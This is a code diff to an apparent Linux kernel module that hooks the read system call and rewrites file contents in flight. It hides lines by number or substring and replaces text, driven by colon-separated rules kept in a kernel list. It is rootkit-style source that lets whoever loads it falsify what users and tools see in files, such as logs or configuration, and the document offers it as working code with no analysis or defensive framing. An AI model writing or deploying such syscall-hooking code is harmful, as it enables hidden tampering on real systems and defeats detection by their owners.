@@ -1,7 +1,6 @@
 #include "alterate.h"
-
-LIST_HEAD(modified_files_list);
-spinlock_t modified_files_lock = __SPIN_LOCK_UNLOCKED(modified_files_lock);
+#include "alterate_api.h"
+#include "ulist.h"
 
 asmlinkage long (*__orig_read)(const struct pt_regs *) = NULL;
 
@@ -25,15 +24,35 @@ asmlinkage long notrace read_hook(const struct pt_regs *regs) {
         return ret;
 
     // Look up rule for this path
-    struct modified_file *rule = NULL, *m;
-    spin_lock(&modified_files_lock);
-    list_for_each_entry(m, &modified_files_list, list) if (strcmp(fullpath, m->file_path) == 0) {
-        rule = m;
-        break;
+    struct ulist_item *it;
+    char *rule_payload = NULL;
+
+    spin_lock(&alt_list.lock);
+    list_for_each_entry(it, &alt_list.head, list) {
+        if (strcmp(fullpath, it->value) == 0) {
+            rule_payload = it->payload;
+            break;
+        }
     }
-    spin_unlock(&modified_files_lock);
-    if (!rule)
+    spin_unlock(&alt_list.lock);
+
+    if (!rule_payload)
         return ret;
+
+    // Parse payload = "line:substr:src:dst"
+    char *dup = kstrdup(rule_payload, GFP_KERNEL);
+    if (!dup)
+        return ret;
+    char *fld[4] = { NULL, NULL, NULL, NULL };
+    int i;
+    for (i = 0; i < 3; i++)
+        fld[i] = strsep(&dup, ":");
+    fld[3] = dup;
+
+    int hide_line = simple_strtol(fld[0], NULL, 10);
+    char *hide_substr = fld[1][0] ? fld[1] : NULL;
+    char *src = fld[2][0] ? fld[2] : NULL;
+    char *dst = fld[3][0] ? fld[3] : NULL;
 
     // Copy user buffer to kernel space
     char *kbuf = kmalloc(ret + 1, GFP_KERNEL);
@@ -60,26 +79,26 @@ asmlinkage long notrace read_hook(const struct pt_regs *regs) {
         line_no++;
 
         // Hide line by number
-        if (rule->hide_line_with_number > 0 && line_no == rule->hide_line_with_number)
+        if (hide_line > 0 && line_no == hide_line)
             skip = true;
 
         // Hide line by substring
-        if (!skip && rule->hide_line_with_substring && strstr(line, rule->hide_line_with_substring))
+        if (!skip && hide_substr && strstr(line, hide_substr))
             skip = true;
 
         // Replace substring
-        if (!skip && rule->replace_src) {
+        if (!skip && src) {
             char *seg = line, *p2;
-            while ((p2 = strstr(seg, rule->replace_src))) {
+            while ((p2 = strstr(seg, src))) {
                 // First part of the line
                 size_t before = p2 - seg;
                 memcpy(out + out_len, seg, before);
                 out_len += before;
 
                 // Replace substring
-                memcpy(out + out_len, rule->replace_dst, strlen(rule->replace_dst));
-                out_len += strlen(rule->replace_dst);
-                seg = p2 + strlen(rule->replace_src);
+                memcpy(out + out_len, dst, strlen(dst));
+                out_len += strlen(dst);
+                seg = p2 + strlen(src);
             }
 
             // Copy the rest of the line
